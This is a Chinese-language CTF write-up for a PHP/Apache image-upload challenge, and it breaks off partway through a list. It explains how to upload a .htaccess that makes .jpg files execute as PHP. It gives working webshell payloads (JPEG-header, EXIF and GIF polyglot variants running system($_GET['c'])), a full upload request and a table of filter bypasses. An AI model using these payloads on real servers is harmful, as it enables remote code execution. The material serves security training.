## 题目背景

### Note

个人相册 · 图片上传（PHP 7.4 + Apache 2.4 + mod_php）：

- 上传接口：`POST /`，字段 `file`，只接受 "图片"
- 存储目录：`/uploads/xx.jpg`（原文件名原样保留）
- 安全策略反明示：
  - 扩展名黑名单：`php / php3 / php4 / php5 / php7 / phtml / pht / phar`
  - MIME 白名单：`image/jpeg, image/png, image/gif`
  - 大小上限 1 MB
  - "系统支持上传 `.htaccess` 文件配置图片路径规则 :)"（送分暗示）

## 漏洞本质

Unrestricted File Upload + `.htaccess` AllowOverride 构成 CWE-434 / OWASP Top 10 A01 + A04 的组合拳。

本题漏洞链三连击：

# 关键前置知识

`.htaccess` 的 5 种 PHP 解析覆写写法：

[代码块边界]apache
# 写法 1: mod_php [本题成功]
AddType application/x-httpd-php .jpg

# 写法 2: mod_php [等效]
SetHandler application/x-httpd-php
# -> 整个目录下所有文件都当 PHP [危险程度 ★★★★★]

# 写法 3: 条件性 [仅 .jpg]
<FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>

# 写法 4: PHP-FPM [需要 socket 路径]
<FilesMatch "\.jpg$">
    SetHandler "proxy:unix:/var/run/php/php7.4-fpm.sock|fcgi://localhost"
</FilesMatch>

# 写法 5: 绕 include 防御
php_flag engine on
AddHandler php5-script .jpg
[代码块边界]

图片马构造的 3 种方法：

**方法 A：简单拼接（本题用）**

[代码块边界]bash
printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > s.jpg
printf '%s' '<?php system($_GET["c"]); ?>' >> s.jpg
[代码块边界]

- `FFD8` = JPEG Start Of Image marker
- `FFE0` + `JFIF\0` = JFIF APP0 segment
- PHP 代码跟在后面，`exif_imagetype()` 会说是 JPEG（只看前几字节）

**方法 B：真图片 + EXIF 注入（绕 GD 重编码）**

[代码块边界]bash
# 用 exiftool 把 PHP 代码放进 EXIF 的 Comment 字段
exiftool -Comment='<?php system($_GET["c"]); ?>' normal.jpg
[代码块边界]

好处：即使服务端 `imagecreatefromjpeg` -> `imagejpeg` 重新编码，EXIF 某些字段能保留。

**方法 C：polyglot 文件（同时合法的 JPEG + PHP + GIF ...）**

[代码块边界]bash
# GIF89a 魔术头 + PHP
GIF89a<?php system($_GET["c"]);?>
[代码块边界]

## Payload 逐字节解析

`.htaccess` 上传请求（multipart/form-data）：

[代码块边界]text
POST / HTTP/1.1
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="file"; filename=".htaccess"
Content-Type: image/jpeg    伪造 MIME（白名单通道）

AddType application/x-httpd-php .jpg    让 .jpg 被 PHP 解析
------X--

服务端处理：
  $ext = pathinfo(.htaccess, PATHINFO_EXTENSION);  // = "" 空字符串（.htaccess 没扩名）
  in_array("", [php, php3, ..., phar])            // false -> 通过黑名单
  in_array("image/jpeg", [image/jpeg, ...])       // true -> 通过 MIME
  move_uploaded_file -> /var/www/html/uploads/.htaccess

Apache 启动时 / 请求时扫描 /uploads/.htaccess，加载指令：
  AddType application/x-httpd-php .jpg
  -> 该目录下所有 .jpg 都按 PHP 处理

## 常见坑

| 问题 | 根因 | 解法 |
| --- | --- | --- |
| `shell.jpg` 响应空 | PHP 代码里 `$_GET` 被 bash 展开成空 | 用单引号 + `printf '%s'` 包裹 |
| `curl -F file=@x` filename 不对 | curl 默认用源路径 basename | 显式 `;filename=target_name` |
| `.htaccess` 不生效 | Apache 配置 `AllowOverride None` | 换 `.user.ini`（PHP-FPM）或利用解析漏洞 |
| `<FilesMatch>` 语法错让 Apache 500 | 正则转义错 | 先本地 `apachectl configtest` |
| PHP-FPM 下 SetHandler 无效 | FPM 需要 fcgi handler 而非 `application/x-httpd-php` | 用 `SetHandler "proxy:unix:..."` |
| 图片马经 GD 重编码后代码丢失 | `imagecreatefromjpeg -> imagejpeg` 去元数据 | 用 EXIF Comment 或 polyglot |
| `exif_imagetype` 防御 | 只看文件头 magic bytes | 拼接 `GIF89a` / JFIF 头 |
| 扩展名双过滤后只剩安全名 | 比如把 `.php` 替换成空 | 用 `.pphphp ->` 替换后 `.php` |
| Nginx `try_files` 拦截 | `/uploads/*.php` 被 try_files 重定向 | 用 `x.jpg/[敏感路径占位]` 老解析漏洞 |
| 文件存在但 404 | Apache `Options -ExecCGI` 或 `php_admin_flag engine off` | 换目录或覆盖子目录 |

## 文件上传进阶 10 谱

### Important

1. `.htaccess` 覆写【本题，Apache + mod_php】
2. `.user.ini` + `auto_prepend_file`【PHP-FPM / CGI】
